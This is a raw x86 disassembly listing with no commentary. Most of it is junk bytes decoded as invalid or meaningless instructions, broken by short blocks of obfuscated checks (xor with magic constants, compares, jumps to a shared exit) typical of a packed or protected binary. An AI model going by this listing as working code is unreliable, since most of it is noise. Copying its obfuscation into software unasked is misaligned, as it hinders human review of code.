  40191c:	mov    dh,0xc6
  40191e:	push   ds
  40191f:	stc    
  401920:	das    
  401921:	test   al,0xac
  401923:	inc    eax
  401924:	imul   eax,edi,0x32aed2d2
  40192a:	stc    
  40192b:	(bad)  
  40192c:	xchg   dh,cl
  40192e:	(bad)  
  40192f:	adc    DWORD PTR [eax+0x570515c0],esp
  401935:	in     eax,dx
  401936:	jno    0x401913
  401938:	cmp    edi,ecx
  40193a:	dec    esi
  40193b:	jo     0x401968
  40193d:	mov    ch,0x7a
  40193f:	loope  0x4019a8
  401941:	push   ecx
  401942:	mov    ebx,0x61eda86a
  401947:	les    esi,FWORD PTR [eax-0x56]
  40194a:	sub    ebx,edi
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xf67bf628
  401994:	fisubr DWORD PTR [ebx]
  401996:	xchg   esp,eax
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	or     eax,0x3abacbdd
  4019a4:	(bad)  
  4019a5:	mov    WORD PTR [esi+0x1f],?
  4019a8:	adc    ebx,ecx
  4019aa:	mov    al,ds:0xf0688a69
  4019af:	lahf   
  4019b0:	jmp    0x6a2:0x47b4988d
  4019b7:	mov    al,0x92
  4019b9:	fwait
  4019ba:	jp     0x40193d
  4019bc:	hlt    
  4019bd:	xchg   ebx,eax
  4019be:	mov    cl,0x9f
  4019c0:	pop    ebp
  4019c1:	ja     0x401a39
  4019c3:	pop    edi
  4019c4:	into   
  4019c5:	rol    BYTE PTR [ecx],0x5c
  4019c8:	retf   
  4019c9:	jmp    0x79f13830
  4019ce:	push   edi
  4019cf:	add    BYTE PTR [edi],0x1a
  4019d2:	mov    ebx,edx
  4019d4:	inc    esp
  4019d5:	loop   0x4019fe
  4019d7:	adc    al,0xb2
  4019d9:	pop    edx
  4019da:	retf   0xc4a7
  4019dd:	daa    
  4019de:	mov    edi,DWORD PTR [eax-0x18]
  4019e1:	add    ecx,eax
  4019e3:	enter  0xa005,0x82
  4019e7:	push   0xffffffeb
  4019e9:	ja     0x401a3e
  4019eb:	aas    
  4019ec:	test   DWORD PTR [eax+0x31],esi
  4019ef:	dec    ecx
  4019f0:	fwait
  4019f1:	iret   
  4019f2:	mov    eax,ds:0x9bd0cd3b
  4019f7:	es mov ah,0x4
  4019fa:	sti    
  4019fb:	cli    
  4019fc:	imul   ecx,DWORD PTR [edx-0x50fe2988],0xffffffb8
  401a03:	sub    BYTE PTR [ebp+0x23],0x15
  401a07:	aaa    
  401a08:	cmp    DWORD PTR [edx+0x6584c2df],0x1f6361fa
  401a12:	test   bl,al
  401a14:	jmp    0x401a5a
  401a16:	lahf   
  401a17:	loope  0x401a88
  401a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a1a:	pop    esi
  401a1b:	(bad)  
  401a1c:	cmp    edx,DWORD PTR [ebp+0x10234dc7]
  401a22:	xor    DWORD PTR [ebx+0x63baa78b],ebp
  401a28:	jae    0x4019bd
  401a2a:	outs   dx,DWORD PTR ds:[esi]
  401a2b:	fwait
  401a2c:	jle    0x4019c6
  401a2e:	dec    eax
  401a2f:	dec    eax
  401a30:	add    BYTE PTR [eax+0x197ec026],0x2
  401a37:	adc    BYTE PTR cs:[eax*8+0x21179dcf],dh
  401a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a40:	mov    fs,WORD PTR [ecx-0x58]
  401a43:	shl    dh,0x52
  401a46:	cwde   
  401a47:	inc    esi
  401a48:	and    BYTE PTR [eax],dl
  401a4a:	cld    
  401a4b:	arpl   WORD PTR fs:[edi+0x6ab17dca],bp
  401a52:	dec    esi
  401a53:	mov    al,0x5b
  401a55:	jnp    0x401a39
  401a57:	mov    cl,0xeb
  401a59:	xchg   ebp,eax
  401a5a:	enter  0xcbb6,0x60
  401a5e:	ins    BYTE PTR es:[edi],dx
  401a5f:	ss popf 
  401a61:	iret   
  401a62:	ror    BYTE PTR [ebp-0x5e],1
  401a65:	adc    bh,BYTE PTR [edx+0x64]
  401a68:	shr    BYTE PTR [ecx+ecx*2-0xd],1
  401a6c:	jmp    0x3bd31db
  401a71:	(bad)  
  401a72:	cwde   
  401a73:	mov    ?,eax
  401a75:	rol    DWORD PTR [edi],1
  401a77:	xchg   ebp,eax
  401a78:	les    ecx,FWORD PTR [ecx-0x18]
  401a7b:	push   esi
  401a7c:	jbe    0x401ae7
  401a7e:	cli    
  401a7f:	mov    edx,0x8208682e
  401a84:	push   0x38e67ff
  401a89:	clc    
  401a8a:	popf   
  401a8b:	mov    al,ds:0xaf852304
  401a90:	retf   
  401a91:	jae    0x401af8
  401a93:	repnz mov esp,0xf010c69
  401a99:	inc    eax
  401a9a:	sbb    esp,DWORD PTR [ecx-0x1c]
  401a9d:	pop    eax
  401a9e:	retf   
  401a9f:	xchg   esi,eax
  401aa0:	mov    esp,0x5f424222
  401aa5:	into   
  401aa6:	ins    BYTE PTR es:[edi],dx
  401aa7:	(bad)  
  401aa8:	and    DWORD PTR [ebx+0x614b222e],ecx
  401aae:	xor    eax,0xc8d86066
  401ab3:	fnsetpm(287 only) 
  401ab5:	icebp  
  401ab6:	mov    ah,dh
  401ab8:	out    dx,eax
  401ab9:	and    BYTE PTR [ecx-0x199fbf8e],dl
  401abf:	ins    DWORD PTR es:[edi],dx
  401ac0:	scas   al,BYTE PTR es:[edi]
  401ac1:	inc    ecx
  401ac2:	arpl   WORD PTR [ebp-0x625f035b],cx
  401ac8:	mov    eax,0xbe9c98bd
  401acd:	mov    ebx,DWORD PTR [ecx-0x15]
  401ad0:	call   FWORD PTR [edx+0x5bba20af]
  401ad6:	cmp    cl,BYTE PTR [edi+0x70]
  401ad9:	in     al,0xc3
  401adb:	push   eax
  401adc:	test   ecx,eax
  401ade:	pushf  
  401adf:	cmp    bl,0x9d
  401ae2:	adc    ebx,esp
  401ae4:	sbb    DWORD PTR [ebx-0x29f6ae28],0x7d
  401aeb:	outs   dx,DWORD PTR ds:[esi]
  401aec:	add    ch,BYTE PTR [edi+ecx*1+0x35b99516]
  401af3:	jne    0x401b2e
  401af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401af6:	hlt    
  401af7:	cmp    DWORD PTR [ecx-0x53e50230],edi
  401afd:	mov    dh,BYTE PTR [ebp+0x64fdf308]
  401b03:	push   ebx
  401b04:	ss fwait
  401b06:	out    dx,al
  401b07:	dec    ebp
  401b08:	pop    ecx
  401b09:	in     eax,dx
  401b0a:	xchg   esp,eax
  401b0b:	lods   eax,DWORD PTR ds:[esi]
  401b0c:	cmc    
  401b0d:	pop    eax
  401b0e:	xor    ecx,DWORD PTR [eax]
  401b10:	setnp  ah
  401b13:	jns    0x401af5
  401b15:	ret    0x32bc
  401b18:	repnz (bad) 
  401b1a:	pushf  
  401b1b:	inc    ebx
  401b1c:	das    
  401b1d:	je     0x401b7c
  401b1f:	jge    0x401b39
  401b21:	popa   
  401b22:	jmp    0x1e23c3cd
  401b27:	pop    ebp
  401b28:	push   0xffffffe8
  401b2a:	mov    bh,0xb0
  401b2c:	mov    ebp,0xa0a0193b
  401b31:	test   eax,0xedd44aed
  401b36:	call   DWORD PTR [esi+0x4]
  401b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b3a:	inc    edi
  401b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b3c:	or     BYTE PTR [edx],0xb2
  401b3f:	jb     0x401af0
  401b41:	xchg   ecx,eax
  401b42:	adc    bl,BYTE PTR [esp+ebx*8+0x68b98651]
  401b49:	arpl   sp,ax
  401b4b:	add    eax,0x49ef2b6d
  401b50:	jecxz  0x401ae7
  401b52:	xlat   BYTE PTR ds:[ebx]
  401b53:	sub    dl,dl
  401b55:	jl     0x401b96
  401b57:	mov    al,0xfe
  401b59:	push   ds
  401b5a:	jns    0x401adf
  401b5c:	xchg   ebp,eax
  401b5d:	sar    BYTE PTR [esi+0x68669227],0x61
  401b64:	out    dx,al
  401b65:	gs mov esi,0x5ff11a15
  401b6b:	xor    eax,0xf7f5e10c
  401b70:	cmp    al,bh
  401b72:	(bad)
  401b76:	mov    BYTE PTR [edx+ebp*4-0x20],ch
  401b7a:	jb     0x401be9
  401b7c:	(bad)  
  401b7d:	lods   eax,DWORD PTR ds:[esi]
  401b7e:	aad    0x89
  401b80:	out    0xce,al
  401b82:	aam    0x9e
  401b84:	mul    BYTE PTR [edi-0xf8b0f4a]
  401b8a:	mov    WORD PTR [esi-0x59],?
  401b8d:	dec    ebp
  401b8e:	cmp    ebx,ecx
  401b90:	pop    edx
  401b91:	xchg   esi,eax
  401b92:	dec    edi
  401b93:	idiv   DWORD PTR [ebp-0x1c]
  401b96:	loop   0x401be7
  401b98:	scas   eax,DWORD PTR es:[edi]
  401b99:	addr16 retf 0x8f05
  401b9d:	xor    BYTE PTR [esi],0x8b
  401ba0:	inc    ebp
  401ba1:	lock mov edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,BYTE PTR [edx+0x29]
  401bde:	xchg   edi,eax
  401bdf:	scas   eax,DWORD PTR es:[edi]
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	aas    
  401be9:	jle    0x401c0d
  401beb:	cmp    al,0xe6
  401bed:	lock shl DWORD PTR [ebx+0x138ca921],cl
  401bf4:	pop    ds
  401bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bf6:	push   ss
  401bf7:	pop    edx
  401bf8:	aam    0xd6
  401bfa:	cmp    BYTE PTR [edx+0x2e],0x8f
  401bfe:	pusha  
  401bff:	daa    
  401c00:	sbb    edx,DWORD PTR [ecx-0x17]
  401c03:	sub    ah,BYTE PTR gs:[ecx-0x4f7666a8]
  401c0a:	dec    ebp
  401c0b:	outs   dx,DWORD PTR ds:[esi]
  401c0c:	adc    al,0x79
  401c0e:	push   es
  401c0f:	ret    0xb3e3
  401c12:	in     eax,dx
  401c13:	mov    BYTE PTR [ecx+0x74211a42],dh
  401c19:	adc    eax,0x8d36a756
  401c1e:	mov    ecx,0x62f9eebd
  401c23:	mov    dh,0x50
  401c25:	ret    0xcec0
  401c28:	ror    BYTE PTR es:[esi-0x779193a7],1
  401c2f:	mov    edi,0xec6bfb13
  401c34:	leave  
  401c35:	adc    edi,DWORD PTR [ebp-0x41914523]
  401c3b:	ret    0x5a56
  401c3e:	jb     0x401c80
  401c40:	add    DWORD PTR [ecx-0x7c565e],ebp
  401c46:	xor    al,0xea
  401c48:	add    BYTE PTR [esi],0xa1
  401c4b:	ret    0xe442
  401c4e:	and    eax,0x20811728
  401c53:	dec    ecx
  401c54:	imul   esi,ecx,0xffffffc7
  401c57:	mov    bl,0x6e
  401c59:	punpckhdq mm2,QWORD PTR [edx+0x35]
  401c5d:	xor    BYTE PTR [esi+0x31],dh
  401c60:	mov    edi,0x79f5776f
  401c65:	fmul   DWORD PTR [edi]
  401c67:	push   ebx
  401c68:	and    al,0x42
  401c6a:	loop   0x401c77
  401c6c:	ret    
  401c6d:	adc    BYTE PTR [esi+0x3c63b84a],cl
  401c73:	sbb    al,BYTE PTR [eax]
  401c75:	dec    edi
  401c76:	mov    ds:0x47f0b0b9,al
  401c7b:	mov    bh,dh
  401c7d:	mov    bl,0x14
  401c7f:	inc    ebx
  401c80:	shr    dl,1
  401c82:	sub    edi,esi
  401c84:	es mov bh,0xfc
  401c87:	leave  
  401c88:	pop    edx
  401c89:	sub    al,0x4e
  401c8b:	dec    ecx
  401c8c:	lahf   
  401c8d:	int    0x53
  401c8f:	nop
  401c90:	inc    edi
  401c91:	inc    ecx
  401c92:	into   
  401c93:	ror    BYTE PTR [esi+0x525c9028],cl
  401c99:	adc    eax,0xf3c21259
  401c9e:	ror    DWORD PTR [ecx],0xc0
  401ca1:	sbb    eax,0xa25de0c
  401ca6:	ins    DWORD PTR es:[edi],dx
  401ca7:	adc    eax,0x31dbb334
  401cac:	lods   eax,DWORD PTR ds:[esi]
  401cad:	retf   0xfb66
  401cb0:	pusha  
  401cb1:	pop    esi
  401cb2:	out    dx,eax
  401cb3:	aaa    
  401cb4:	mov    al,ds:0x4373a900
  401cb9:	push   eax
  401cba:	bound  esp,QWORD PTR [edx+ebp*8+0x6017fc74]
  401cc1:	xacquire xchg DWORD PTR [eax+ebx*2],edi
  401cc5:	repnz mov bh,BYTE PTR [eax]
  401cc8:	in     eax,dx
  401cc9:	ins    DWORD PTR es:[edi],dx
  401cca:	(bad)  
  401ccb:	pop    ebx
  401ccc:	mov    ebp,0x8dc29a1f
  401cd1:	mov    dl,0xa0
  401cd3:	adc    bl,bl
  401cd5:	enter  0xf201,0x2c
  401cd9:	or     esp,DWORD PTR [edx-0x1500e500]
  401cdf:	icebp  
  401ce0:	push   ecx
  401ce1:	or     ebx,DWORD PTR [ecx]
  401ce3:	fs (bad) 
  401ce6:	jg     0x401c98
  401ce8:	pusha  
  401ce9:	outs   dx,DWORD PTR ds:[esi]
  401cea:	loop   0x401cd8
  401cec:	popf   
  401ced:	fsub   QWORD PTR [edi-0x73]
  401cf0:	dec    esi
  401cf1:	rcl    BYTE PTR [edi-0x40],cl
  401cf4:	mov    ds,WORD PTR ds:0x77c74f67
  401cfa:	sub    al,0xc8
  401cfc:	and    dl,BYTE PTR [ebp-0x209351ac]
  401d02:	inc    edx
  401d03:	add    BYTE PTR es:[esp+ebp*8],dh
  401d07:	cld    
  401d08:	mov    dh,0x52
  401d0a:	add    edi,DWORD PTR [esi+0x66bdf4be]
  401d10:	xchg   ebx,eax
  401d11:	out    0x1e,eax
  401d13:	fist   WORD PTR [edi-0x58122b87]
  401d19:	jmp    0xfa55:0x6ed7f6ca
  401d20:	test   edi,edx
  401d22:	call   0x9b5ee6aa
  401d27:	inc    ebp
  401d28:	div    DWORD PTR [edi]
  401d2a:	(bad)  
  401d2b:	and    edi,DWORD PTR [edi+0x70]
  401d2e:	pop    es
  401d2f:	add    eax,0x689e0b79
  401d34:	and    DWORD PTR [edx+edx*8],0x7ecfd7cc
  401d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d3c:	inc    eax
  401d3d:	mov    cl,0x6b
  401d3f:	pop    ss
  401d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d41:	mov    ebp,0x1e8ceb19
  401d46:	mul    ebp
  401d48:	std    
  401d49:	out    dx,al
  401d4a:	cmc    
  401d4b:	mov    esi,0x7bcabf82
  401d50:	xchg   esp,eax
  401d51:	xor    al,0xee
  401d53:	dec    edx
  401d54:	mov    ch,0x2f
  401d56:	sar    BYTE PTR [eax+0x7d],0x4a
  401d5a:	xchg   ebp,eax
  401d5b:	outs   dx,BYTE PTR ds:[esi]
  401d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5d:	sbb    dh,BYTE PTR [esi+0x92d3801]
  401d63:	mov    esi,0xc0272466
  401d68:	mov    esi,0xca869e98
  401d6d:	scas   eax,DWORD PTR es:[edi]
  401d6e:	or     bh,BYTE PTR [esi+eiz*8-0x178764d7]
  401d75:	push   cs
  401d76:	addr16 lock jb 0x401d92
  401d7a:	shr    BYTE PTR [edx+edi*1+0x216b7e0d],0x23
  401d82:	pop    esp
  401d83:	xlat   BYTE PTR ds:[ebx]
  401d84:	mov    ch,0x67
  401d86:	jmp    eax
  401d88:	xor    eax,0x4af2a6de
  401d8d:	inc    edx
  401d8e:	(bad)  
  401d90:	jp     0x401dee
  401d92:	sti    
  401d93:	das    
  401d94:	mov    bl,dl
  401d96:	pop    edi
  401d97:	or     edx,esi
  401d99:	pop    esi
  401d9a:	xchg   esp,eax
  401d9b:	clc    
  401d9c:	mov    al,ds:0xbe803790
  401da1:	out    0xe1,eax
  401da3:	and    cl,BYTE PTR [edi]
  401da5:	inc    ebp
  401da6:	inc    esi
  401da7:	mov    ecx,0x8e145531
  401dac:	mov    ecx,0xc90c8197
  401db1:	dec    edi
  401db2:	xor    DWORD PTR es:[edi-0x32],ecx
  401db6:	(bad)
  401dba:	loop   0x401df2
  401dbc:	mov    ch,0xc
  401dbe:	fxtract 
  401dc0:	mov    eax,ds:0x6dfd5083
  401dc5:	inc    edx
  401dc6:	inc    esp
  401dc7:	call   0xb92a4934
  401dcc:	mov    bl,0x86
  401dce:	adc    al,BYTE PTR [edi-0x1d41896d]
  401dd4:	popf   
  401dd5:	sti    
  401dd6:	cmp    eax,0xfd7c171
  401ddb:	neg    BYTE PTR [edi-0x1f]
  401dde:	repnz add ch,BYTE PTR [ebp+0x79]
  401de2:	push   eax
  401de3:	(bad)  
  401de4:	inc    ebp
  401de5:	js     0x401d67
  401de7:	xchg   edx,eax
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ebx+eiz*8+0x1c],dl
  401e44:	cmc    
  401e45:	dec    eax
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	fldenv [esi-0x36]
  401e51:	js     0x401e87
  401e53:	out    0xaa,eax
  401e55:	retf   0xf98f
  401e58:	dec    ebp
  401e59:	das    
  401e5a:	or     edx,0xffffff83
  401e5d:	cmc    
  401e5e:	arpl   ax,cx
  401e60:	hlt    
  401e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e62:	mov    DWORD PTR [edx+0x34],ebx
  401e65:	xchg   esi,eax
  401e66:	add    eax,0xeff20a1d
  401e6b:	sti    
  401e6c:	inc    ecx
  401e6d:	mov    ch,0xc9
  401e6f:	nop
  401e70:	mov    cl,0x6a
  401e72:	enter  0x3c29,0x5b
  401e76:	iret   
  401e77:	jae    0x401ebc
  401e79:	dec    eax
  401e7a:	mov    edi,0x6f109bc9
  401e7f:	int    0x50
  401e81:	push   0x9bea63bb
  401e86:	mov    bl,0x7e
  401e88:	cmp    DWORD PTR [ebx+ebx*4],eax
  401e8b:	sub    BYTE PTR [edx+0x6ddad70a],0x9a
  401e92:	mov    eax,0xc47d9f57
  401e97:	xchg   esp,ecx
  401e99:	add    BYTE PTR [ecx],al
  401e9b:	and    al,0xf6
  401e9d:	cmp    al,0x83
  401e9f:	(bad)  
  401ea0:	push   ebp
  401ea1:	enter  0xa0b4,0x7c
  401ea5:	adc    ch,BYTE PTR [ecx]
  401ea7:	xor    al,0xb1
  401ea9:	not    esi
  401eab:	jns    0x401e52
  401ead:	in     al,dx
  401eae:	fild   DWORD PTR [ebp-0x2e]
  401eb1:	data16 jle 0x401f1e
  401eb4:	sub    bh,ah
  401eb6:	mov    ?,edx
  401eb8:	or     BYTE PTR ds:0x6871499e,al
  401ebe:	ds pop eax
  401ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ec1:	inc    edx
  401ec2:	jg     0x401e91
  401ec4:	int    0xb6
  401ec6:	data16 repz rcr BYTE PTR [edi-0x5c],1
  401ecb:	add    BYTE PTR [esi],bh
  401ecd:	shl    BYTE PTR [ebx-0x2],cl
  401ed0:	mov    DWORD PTR [edi+0x4],ecx
  401ed3:	dec    esp
  401ed4:	aaa    
  401ed5:	inc    edx
  401ed6:	sbb    ebp,DWORD PTR [ebx]
  401ed8:	rcr    BYTE PTR [edx],0x85
  401edb:	lea    ebx,[esi-0x24]
  401ede:	ret    0x4ff0
  401ee1:	jl     0x401f37
  401ee3:	das    
  401ee4:	mov    ch,dh
  401ee6:	pop    esi
  401ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ee8:	jge    0x401e90
  401eea:	sbb    ecx,DWORD PTR [ebx+0x26]
  401eed:	xchg   ebx,eax
  401eee:	icebp  
  401eef:	ror    esi,cl
  401ef1:	cld    
  401ef2:	and    ebp,DWORD PTR [eax]
  401ef4:	les    edx,FWORD PTR [ecx+0x2665ef3]
  401efa:	sbb    eax,0xa0c48e1a
  401eff:	add    BYTE PTR [edx-0x27],bh
  401f02:	xor    ah,BYTE PTR [ebx-0x7b]
  401f05:	mov    ebp,0x3f0ad2ae
  401f0a:	(bad)  
  401f0b:	push   edx
  401f0c:	jge    0x401e95
  401f0e:	and    ah,BYTE PTR [esi]
  401f10:	repz xchg ecx,eax
  401f12:	mov    bl,0x49
  401f14:	scas   al,BYTE PTR es:[edi]
  401f15:	push   ecx
  401f16:	cmp    edi,DWORD PTR [edi+0x3d6e41d]
  401f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f1d:	mov    esi,0xda2f352b
  401f22:	push   ebx
  401f23:	or     BYTE PTR [esi+ecx*8-0x54e5616f],ah
  401f2a:	xchg   ecx,eax
  401f2b:	cwde   
  401f2c:	sbb    ah,dl
  401f2e:	lods   eax,DWORD PTR ds:[esi]
  401f2f:	and    al,0xb4
  401f31:	arpl   WORD PTR [eax],bx
  401f33:	xchg   ebx,eax
  401f34:	jnp    0x401f87
  401f36:	mov    dh,0xc2
  401f38:	mov    ah,0xf5
  401f3a:	test   eax,0xf8b7074a
  401f3f:	arpl   WORD PTR [edx],si
  401f41:	sub    DWORD PTR [ecx],ebx
  401f43:	jle    0x401efe
  401f45:	arpl   WORD PTR [ecx],cx
  401f47:	jae    0x401f92
  401f49:	mov    ah,0x91
  401f4b:	ret    0xd541
  401f4e:	mov    edi,0xec063fbb
  401f53:	out    dx,al
  401f54:	pop    esi
  401f55:	cli    
  401f56:	addr16 jmp 0xbe8e5464
  401f5c:	push   es
  401f5d:	lds    eax,FWORD PTR [ecx-0x71]
  401f60:	leave  
  401f61:	gs (bad) 
  401f63:	das    
  401f64:	lea    eax,[eax]
  401f66:	int    0x32
  401f68:	into   
  401f69:	out    dx,al
  401f6a:	not    DWORD PTR [ecx-0x24]
  401f6d:	push   esp
  401f6e:	lods   eax,DWORD PTR ds:[esi]
  401f6f:	pop    ds
  401f70:	dec    DWORD PTR [ebx+0x10ceeaa]
  401f76:	jle    0x401fc7
  401f78:	add    DWORD PTR [edx],eax
  401f7a:	rcr    BYTE PTR [eax-0x63],1
  401f7d:	jecxz  0x401fd2
  401f7f:	call   0x5a18:0xc1740416
  401f86:	lods   al,BYTE PTR ds:[esi]
  401f87:	adc    DWORD PTR [esp+esi*2],ecx
  401f8a:	call   0x985e76aa
  401f8f:	xor    ebx,DWORD PTR [edx-0x5d]
  401f92:	jge    0x401fe2
  401f94:	(bad)  
  401f95:	dec    esp
  401f96:	out    0xe7,al
  401f98:	mov    edi,0x77cb3cec
  401f9d:	clc    
  401f9e:	cs pop ss
  401fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa1:	dec    edi
  401fa2:	push   es
  401fa3:	fild   QWORD PTR [edi-0x1ea09d]
  401fa9:	dec    edi
  401faa:	ret    
  401fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fac:	js     0x401f5e
  401fae:	xchg   edi,eax
  401faf:	mov    edx,DWORD PTR [ebp-0x58]
  401fb2:	hlt    
  401fb3:	jno    0x401ffb
  401fb5:	popf   
  401fb6:	out    dx,eax
  401fb7:	mov    eax,ds:0x66301231
  401fbc:	jb     0x401f90
  401fbe:	xor    dh,bl
  401fc0:	imul   edx,DWORD PTR [esi-0x53021042],0x36a773ef
  401fca:	loop   0x401fb1
  401fcc:	xchg   esi,eax
  401fcd:	or     ebx,eax
  401fcf:	popf   
  401fd0:	dec    ebx
  401fd1:	jle    0x402039
  401fd3:	sbb    eax,DWORD PTR [ebx-0x24c5a324]
  401fd9:	and    edi,DWORD PTR [ecx-0x27682671]
  401fdf:	sar    DWORD PTR [edi],1
  401fe1:	ins    BYTE PTR es:[edi],dx
  401fe2:	iret   
  401fe3:	test   BYTE PTR [ebx],ah
  401fe5:	mov    eax,0x260e77a5
  401fea:	pop    ebp
  401feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fec:	loope  0x401ff1
  401fee:	and    DWORD PTR [edx-0x4c],edi
  401ff1:	ror    DWORD PTR [esi],cl
  401ff3:	fs mov al,0xff
  401ff6:	or     BYTE PTR [esi],bh
  401ff8:	pop    ds
  401ff9:	xchg   esi,eax
  401ffa:	xchg   edx,eax
  401ffb:	repz mov eax,0x7da4b442
  402001:	xchg   esi,eax
  402002:	fisttp DWORD PTR [ebx+eax*2-0x30]
  402006:	xchg   ebx,eax
  402007:	adc    al,0xe
  402009:	imul   ebp,DWORD PTR [ebx],0x835f51e3
  40200f:	pslld  mm1,mm4
  402012:	cmp    BYTE PTR [edx],ch
  402014:	aad    0x29
  402016:	loope  0x40206d
  402018:	jge    0x402095
  40201a:	(bad)
  40201e:	dec    edi
  40201f:	and    eax,esi
  402021:	mov    dl,0xc4
  402023:	inc    ebx
  402024:	ret    
  402025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402026:	leave  
  402027:	or     DWORD PTR [edx+0x59],esi
  40202a:	add    edi,DWORD PTR [edx]
  40202c:	ja     0x402045
  40202e:	jg     0x402001
  402030:	add    bl,BYTE PTR [esi+0x3c]
  402033:	hlt    
  402034:	ja     0x401fd5
  402036:	sbb    ecx,0xed9d15b5
  40203c:	and    eax,0x6cdfb919
  402041:	pusha  
  402042:	mov    cl,0x44
  402044:	test   eax,0x7d5077c0
  402049:	sbb    eax,0x1cbaa2be
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    ch,0xa2
  40206c:	mov    ah,BYTE PTR [edx+0x70700470]
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	pop    esi
  402077:	sbb    DWORD PTR [esi],esp
  402079:	sbb    BYTE PTR [ebx],0x11
  40207c:	xchg   ebx,eax
  40207d:	shl    DWORD PTR [eax-0x29],1
  402080:	lahf   
  402081:	cmc    
  402082:	ret    0xa2b8
  402085:	sub    edi,DWORD PTR [edi-0x7be00fe6]
  40208b:	retf   
  40208c:	xor    al,0x35
  40208e:	lahf   
  40208f:	call   0x4ae94d74
  402094:	repnz mov fs,WORD PTR [ebp+0x7a637034]
  40209b:	mov    esi,0x4785ffaf
  4020a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020a1:	jp     0x4020f9
  4020a3:	jo     0x402053
  4020a5:	cmp    al,0x56
  4020a7:	ror    edx,cl
  4020a9:	sbb    DWORD PTR [ecx+0x7a],ecx
  4020ac:	adc    esp,DWORD PTR [eax-0x589e21dc]
  4020b2:	mov    eax,ss:0x10a6591b
  4020b8:	and    BYTE PTR [esi+0x4fd3320c],ch
  4020be:	and    al,0x5b
  4020c0:	fdivr  DWORD PTR [ebx-0xa8b6dd6]
  4020c6:	inc    ebp
  4020c7:	imul   ebp,DWORD PTR [edx+0x1736106c],0xe
  4020ce:	addr16 pop esp
  4020d0:	pusha  
  4020d1:	cmp    ch,BYTE PTR ds:0xedc484a0
  4020d7:	outs   dx,BYTE PTR ds:[esi]
  4020d8:	cmc    
  4020d9:	clc    
  4020da:	mov    ebp,0x86da164c
